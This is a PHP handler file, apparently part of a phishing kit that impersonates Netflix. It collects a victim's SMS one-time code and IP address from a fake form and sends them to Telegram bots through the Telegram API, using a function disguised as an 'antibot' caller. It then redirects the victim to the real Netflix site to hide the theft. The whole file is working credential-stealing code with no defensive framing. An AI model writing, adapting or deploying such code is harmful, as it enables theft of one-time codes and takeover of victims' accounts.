<?php

include("../../secure/anti10.php");
include("../gg.php");
$OS = getOS($_SERVER['HTTP_USER_AGENT']); 
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$ccya = $_POST['cc'];
$ip = $_SERVER['REMOTE_ADDR'];
$message ="
📺 NETFLIX [SMSerror] 📺
SMS : [ ".$_POST['signupOtpCode']." ]
📺 ".$ip."  📺 \n";

$theip = $message;
function antiBotsCaller($messaggio,$token,$chatid) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
/*ANTIBOT BLOCKER You can  block IP
  IN File ANTI/anti1.php.*/
antiBotsCaller($theip,$antit2,$antic1);
/*------------------------------------*/ 
antiBotsCaller($message,$token,$chatid);
header("Location: https://www.netflix.com/");

?>